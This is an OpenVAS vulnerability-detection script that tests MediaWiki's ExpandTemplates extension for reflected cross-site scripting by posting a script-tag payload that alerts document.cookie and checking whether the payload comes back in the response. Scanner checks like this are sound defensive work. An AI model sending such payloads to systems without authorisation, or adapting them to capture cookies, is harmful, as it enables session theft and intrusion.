###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mediawiki_expandtemplates_mul_xss_vuln.nasl 3514 2016-06-14 11:29:47Z mime $
#
# MediaWiki ExpandTemplates extension Multiple Vulnerabilities - Jan15
#
# Authors:
# Deependra Bapna <bdeependra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mediawiki:mediawiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805327");
  script_version("$Revision: 3514 $");
  script_cve_id("CVE-2014-9276", "CVE-2014-9478");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-06-14 13:29:47 +0200 (Tue, 14 Jun 2016) $");
  script_tag(name:"creation_date", value:"2015-01-23 12:37:41 +0530 (Fri, 23 Jan 2015)");
  script_name("MediaWiki ExpandTemplates extension Multiple Vulnerabilities - Jan15");

  script_tag(name:"summary", value:"This host is installed with ExpandTemplates
  extension for MediaWiki is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple flaws exist when'$wgRawHtml' is set to true.
  - Input passed via 'wpInput' parameter in the script is not validated
     before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attacker to execute arbitrary script code in a user's browser
  session within the trust relationship between their browser and the server.

  Impact Level: Application");

  script_tag(name:"affected", value:"ExpandTemplates version before 1.24
  extension for MediaWiki.");

  script_tag(name:"solution", value:"Upgrade to ExpandTemplates version 1.24.1
  or later. For updates refer to http://www.mediawiki.org/wiki/Extension:ExpandTemplates");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name : "URL" , value : "https://phabricator.wikimedia.org/T773111");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2015/01/03/13");
  script_summary("Check if ExpandTemplates extension for MediaWiki is vulnerable to xss");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "secpod_mediawiki_detect.nasl");
  script_mandatory_keys("mediawiki/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

##Code starts from here##

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
req = "";
res = "";
dir = "";
reqwiki = "";
reswiki = "";
wikiPort = "";

## Get HTTP Port
wikiPort = get_http_port(default:80);
if(!wikiPort){
  wikiPort = 80;
}

## Check the port state
if(!get_port_state(wikiPort)){
 exit(0);
}

#Check if host supports php
if(!can_host_php(port:wikiPort)){
 exit(0);
}

## Get Mediawiki Location
if(!dir = get_app_location(cpe:CPE, port:wikiPort)){
  exit(0);
}
  reqwiki = http_get(item:string(dir, "/index.php/Special:Version"), port:wikiPort);
  reswiki = http_keepalive_send_recv(port:wikiPort, data:reqwiki);

  ## confirm the plugin
  if (reswiki =~">ExpandTemplates<")
  {
   ## Construct the attack request
   postData = string('contexttitle=&input=<html><script>alert(document.cookie)</script>
                      </html>&removecomments=1&wpEditToken=+\\');
   url =dir+"/index.php/Special:ExpandTemplates";
   #Send Attack Request
   sndReq = string("POST ", url, " HTTP/1.1\r\n",
                   "Host: ", get_host_name(), "\r\n",
                   "Referer: ", url, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(postData), "\r\n\r\n",
                   "\r\n", postData, "\r\n");

   rcvRes = http_keepalive_send_recv(port:wikiPort, data:sndReq);

   #Confirm Exploit
   if (rcvRes =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< rcvRes)
   {
    security_message(wikiPort);
    exit(0);
   }

  }
